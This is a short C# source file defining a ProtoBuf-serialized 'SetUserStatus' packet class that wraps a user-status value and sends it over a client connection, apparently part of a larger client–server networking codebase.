using ProtoBuf;
using xClient.Core.Networking;
using UserStatus = xClient.Core.Commands.CommandHandler.UserStatus;

namespace xClient.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class SetUserStatus : IPacket
    {
        [ProtoMember(1)]
        public UserStatus Message { get; set; }

        public SetUserStatus()
        {
        }

        public SetUserStatus(UserStatus message)
        {
            Message = message;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}